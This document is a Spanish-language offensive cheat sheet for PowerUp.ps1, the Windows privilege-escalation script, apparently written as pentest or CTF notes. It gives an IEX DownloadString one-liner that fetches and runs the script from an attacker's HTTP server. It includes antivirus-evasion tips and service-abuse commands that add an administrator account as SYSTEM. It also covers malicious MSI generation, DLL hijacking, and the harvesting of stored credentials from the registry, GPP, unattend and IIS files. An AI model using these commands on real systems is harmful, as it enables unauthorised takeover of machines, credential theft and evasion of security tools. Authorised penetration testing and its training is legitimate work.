# PowerUp.ps1

Tags: #Windows #Powershell #PowerUp #PrivEsc #Enumeracion #Servicios #PostExplotacion

## OBJETIVO

- Comprobaciones de escalada local mediante PowerShell. Se enfoca en ciertas configuraciones débiles, como permisos de servicios y claves de registro. `Invoke-AllChecks` ejecuta varias comprobaciones.

## TIPS

1. **Invoke-AllChecks → ejecutarlo siempre al entrar → resumen completo de vectores**
2. **Si AV detecta el script → usar la versión ofuscada o cargar en memoria con IEX**
3. **Cada resultado incluye AbuseFunction → te dice exactamente cómo explotar el vector**
4. **Complementar con winPEAS → PowerUp es más específico para PrivEsc local**
5. **Para ofuscar → ir a línea 2640 → eliminar contenido de la variable $B64Binary**

## RECURSOS

- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

## 1. TRANSFERIR Y CARGAR EL SCRIPT

```powershell
# Opción 1 → Cargar en memoria desde servidor HTTP (sin tocar disco → más sigiloso)
# En Kali → python3 -m http.server 80
❯ IEX (New-Object Net.WebClient).DownloadString('http://<IP_KALI>/PowerUp.ps1') | iex; Invoke-AllChecks

# Opción 2 → Subir y ejecutar desde disco
❯ upload /ruta/kali/PowerUp.ps1          # Desde evil-winrm
❯ Import-Module .\PowerUp.ps1
❯ Invoke-AllChecks

# Opción 3 → Versión ofuscada si AV detecta la normal
❯ Import-Module .\PowerUp_obf.ps1
❯ Invoke-AllChecks
# Para ofuscar → abrir PowerUp.ps1 → línea 2640 → eliminar contenido de $B64Binary
```

---

## 2. ENUMERACIÓN COMPLETA

```powershell
❯ Invoke-AllChecks
# Ejecuta TODOS los checks disponibles → output completo
# Cada resultado incluye: ServiceName, Path, AbuseFunction → cómo explotarlo
# Buscar en el output: CanRestart = True → puedes reiniciar el servicio → explotar ahora

❯ Invoke-AllChecks | Out-File -Encoding ASCII C:\tmp\powerup_results.txt
# Guardar output a archivo → más fácil de revisar
# Transferir a Kali → cat powerup_results.txt
```

---

## 3. CHECKS INDIVIDUALES

### Servicios

```powershell
❯ Get-ServiceUnquoted
# Unquoted Service Path → rutas de servicios con espacios y sin comillas
# Buscar: ModifiablePath → directorio donde puedes escribir el binario falso

❯ Get-ModifiableServiceFile
# Permisos débiles en el ejecutable del servicio → puedes reemplazarlo

❯ Get-ModifiableService
# Permisos débiles en la configuración del servicio → puedes cambiar el binPath

❯ Invoke-ServiceAbuse -Name 'VulnerableService'
# Explotar servicio vulnerable directamente → añade usuario local como admin
# Requiere: CanRestart = True o reinicio manual del sistema

❯ Invoke-ServiceAbuse -Name 'VulnerableService' -Command "net user omar P4ssw0rd /add"
# Ejecutar comando personalizado como SYSTEM vía el servicio
```

### Registro y AlwaysInstallElevated

```powershell
❯ Get-RegistryAlwaysInstallElevated
# Verifica si AlwaysInstallElevated está habilitado en HKCU y HKLM
# Si devuelve True → generar MSI malicioso → instalar como SYSTEM

❯ Write-UserAddMSI
# Genera MSI malicioso que añade usuario al grupo Administrators
# Ejecutar el .msi generado → instala como SYSTEM si AlwaysInstallElevated activo
```

### Credenciales y autologon

```powershell
❯ Get-RegistryAutoLogon
# Busca credenciales de autologon en el registro → contraseña en claro
# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

❯ Get-CachedGPPPassword
# Busca contraseñas en archivos XML de Group Policy Preferences cacheados
# Credenciales cifradas con AES → clave conocida → descifrar automáticamente

❯ Get-UnattendedInstallFile
# Busca archivos de instalación desatendida → pueden contener credenciales
# Ubicaciones: C:\unattend.xml, C:\Windows\Panther\Unattend.xml

❯ Get-WebConfig
# Busca credenciales cifradas en web.config de IIS
# Descifra automáticamente las cadenas de conexión cifradas

❯ Get-ApplicationHost
# Busca contraseñas de application pools en applicationHost.config de IIS
```

### PATH y DLL Hijacking

```powershell
❯ Find-PathDLLHijack
# Busca directorios escribibles en el PATH del sistema
# Si hay uno → plantar DLL maliciosa con el nombre que busca un proceso privilegiado
```

### Tareas programadas

```powershell
❯ Get-ModifiableScheduledTaskFile
# Busca tareas programadas cuyo script o ejecutable es modificable
# Si CanRestart o está programada → modificar → esperar ejecución como SYSTEM
```
